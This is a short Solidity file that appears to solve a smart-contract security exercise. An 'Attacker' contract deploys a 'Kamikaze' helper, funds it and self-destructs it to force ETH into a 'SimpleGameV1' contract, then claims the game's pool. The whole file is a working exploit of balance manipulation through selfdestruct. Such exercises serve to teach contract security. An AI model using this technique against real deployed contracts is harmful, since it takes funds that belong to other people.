// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "./SimpleGameV1.sol";

contract Attacker {

    /**
     * @notice Wins a Silverfish game by claiming the pool money successfully
     * @param game address of simple game to win
     * @dev You can assume SimpleGameV1 already has 0.5 ETH in the pool
     */
    function attack(SimpleGameV1 game) public payable {
        Kamikaze newTerrorist = new Kamikaze(address(game));
        payable(newTerrorist).send(address(this).balance);
        newTerrorist.destroy();
        game.claim();
    }

    receive() external payable {}
}

contract Kamikaze {

    address private target;

    constructor(address _target) public {
        target = _target;
    }

    receive() external payable {}

    function destroy() external {
        selfdestruct(payable(target));
    }
}